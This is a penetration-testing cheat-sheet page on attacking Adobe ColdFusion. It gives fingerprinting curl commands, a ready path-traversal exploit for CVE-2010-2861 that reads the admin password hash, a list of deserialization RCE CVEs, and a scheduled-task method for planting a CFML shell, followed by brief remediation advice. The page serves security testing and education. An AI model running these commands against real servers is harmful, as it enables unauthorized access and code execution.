---
tags:
  - Web
---

# :material-fire: Adobe ColdFusion

<span class="pill pill-hard">legacy → RCE</span> <span class="pill pill-info">web</span>

ColdFusion (CFML) is old enterprise middleware with a rich history of **unauth
admin access, LFI, and deserialization RCE** — when you find it, it's usually a win.

!!! abstract "TL;DR"
    Fingerprint via `.cfm`/`/CFIDE/` → match a CVE (admin auth-bypass LFI, the
    2023 deserialization RCEs) → read the admin password hash or get RCE directly.

## :material-magnify: Identify

```bash
curl -sI http://$TARGET/CFIDE/administrator/index.cfm     # admin console
curl -s http://$TARGET/CFIDE/adminapi/base.cfc?wsdl       # version fingerprint
# .cfm / .cfc extensions, "ColdFusion" in errors/headers
```

## :material-file-eye: Classic LFI → admin

```bash
# CVE-2010-2861 — LFI reads the admin password hash
curl "http://$TARGET/CFIDE/administrator/enter.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties%00en"
# hash → log into /CFIDE/administrator → scheduled task / mapping → RCE
```

## :material-fire: Deserialization RCE

```text
# CVE-2017-3066   — BlazeDS AMF Java deserialization RCE
# CVE-2023-26360 / 26359 — unauth deserialization RCE (CF 2018/2021) — exploited ITW
# CVE-2023-29300 — WDDX deserialization RCE
# use ysoserial / public PoCs matched to the version
```

!!! loot "Admin console = built-in RCE"
    From `/CFIDE/administrator`: create a **scheduled task** that fetches+executes a
    CFML shell, or add a mapping and upload one. See [Deserialization](../web/deserialization.md).

## :material-shield-check: Remediation

- Patch (CF deserialization CVEs are actively exploited); lock down `/CFIDE`;
  strong admin creds; remove sample apps.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Deserialization → [Deserialization](../web/deserialization.md); shell → [Windows](../privesc/windows.md)/[Linux](../privesc/linux.md).
- Reference: [HackTricks ColdFusion](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html).
